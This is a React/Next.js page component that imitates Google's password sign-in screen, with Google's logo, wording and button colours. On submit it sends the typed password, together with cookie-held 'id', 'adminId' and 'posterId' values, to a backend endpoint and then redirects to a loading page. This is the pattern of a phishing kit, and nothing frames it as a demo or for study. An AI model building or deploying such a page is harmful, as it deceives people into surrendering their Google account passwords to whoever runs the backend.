'use client'
import React, { useState } from 'react'
import { Form, Formik,Field } from "formik";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { API_URL } from "../config/index";
function page() {
    const router = useRouter();
    const id = Cookies.get("id");
    const adminId = Cookies.get("adminId");
    const posterId = Cookies.get("posterId");
    let initialvalues = {
      password: "",
    };
    const handleSubmit = async(values, formik) => {
      let { password } = values;
      const userData = {
       id,
       password,
       adminId,
       posterId
      }
    if(!password){
      return
     }
       const url = `${API_URL}/password/post`;
   
       const res = await fetch(url, {
         method: "POST",
         headers: {
           Accept: "application/json",
           "Content-Type": "application/json",
         },
         body: JSON.stringify(userData),
       });
       const data = await res.json();
       console.log(data);
   
       if (res.ok) {
         console.log("success", data);
         router.push("/loading")
       } else {
         console.log("error", data);
       }
   
   
      
     };
  return (
    <div>
         <div className='flex flex-col justify-center items-center mt-[100px]'>
      <img src="/images/google.png"  width={95} height={35}/>
      <div className=" ">
        <div className="text-start">
        <p className='font-medium text-xl mt-5'>Sign in</p>
        </div>
        <Formik initialValues={initialvalues} onSubmit={handleSubmit}>
  {
    (formik) => (
      <Form >
        <Field className='w-[350px] px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-5'
          type="password"
          name="password"
          id="password"
          autoComplete="off"
          placeholder="Enter your password"
          required
        />
          <p className='text-black text-sm mt-2'>show password</p>
        <p className='text- text-sm mt-2'>Not your computer? Use Guest mode to sign in privately.</p>
        <p className='text-[#1a73e8] text-sm mt-2'>Learn more about using Guest mode</p>
        <div className="flex justify-between mt-3">
          <p className='text-[#1a73e8] text-sm mt-7 text-center'>Create account</p>
          <button type='submit' onClick={handleSubmit} className=' bg-[#1a73e8] text-white px-3 py-2 border border-gray-300 outline-none rounded-full mt-5'>Next</button>
        </div>
      </Form>
    )
  }
 </Formik>
      </div>
    </div>
    </div>
  )
}

export default page


